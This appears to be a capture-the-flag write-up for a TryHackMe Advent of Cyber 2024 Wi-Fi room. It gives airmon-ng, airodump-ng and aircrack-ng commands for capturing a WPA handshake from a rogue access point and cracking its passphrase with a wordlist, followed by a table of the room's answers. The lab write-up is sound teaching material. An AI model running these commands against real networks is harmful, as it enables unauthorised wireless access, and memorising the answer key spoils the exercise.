# Advent of Cyber 2024 - Day 11: Wi-Fi

{% embed url="https://tryhackme.com/room/adventofcyber2024" %}

It's beginning to look a lot like a rogue access point!

## Background

Wireless security requires analyzing 802.11 management frames and authentication handshakes. Threat actors deploy rogue access points ("Evil Twins") spoofing legitimate network SSIDs to trick clients into connecting or disclosing credentials.

The WPA/WPA2 4-way handshake negotiates encryption keys. By capturing this handshake using packet sniffers (`airodump-ng`) and sending deauthentication frames (`aireplay-ng`), attackers can crack the pre-shared key (PSK) offline using wordlist attacks.

## Walkthrough

**Step 1 — Enable Monitor Mode**

Put the wireless interface into monitor mode:
```bash
sudo airmon-ng start wlan0
```

**Step 2 — Discover Rogue Access Points**

Scan nearby wireless networks:
```bash
sudo airodump-ng wlan0mon
```
Identified networks:
- Legit AP: BSSID `02:00:00:00:00:00`
- Evil Twin AP: BSSID `02:00:00:00:02:00` broadcasting SSID `MalwareM_AP`
- Connected Client: MAC `02:00:00:00:01:00`

**Step 3 — Capture Handshake and Crack Passphrase**

Capture frames on channel 6:
```bash
sudo airodump-ng -c 6 --bssid 02:00:00:00:02:00 -w capture wlan0mon
```
Crack the captured 4-way handshake:
```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```
The passphrase is recovered: `fluffy/champ24`.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the BSSID of the rogue access point? | `02:00:00:00:02:00` |
| What SSID is broadcast by the rogue AP? | `MalwareM_AP` |
| What is the MAC address of the connected client? | `02:00:00:00:01:00` |
| What is the WPA passphrase for the network? | `fluffy/champ24` |
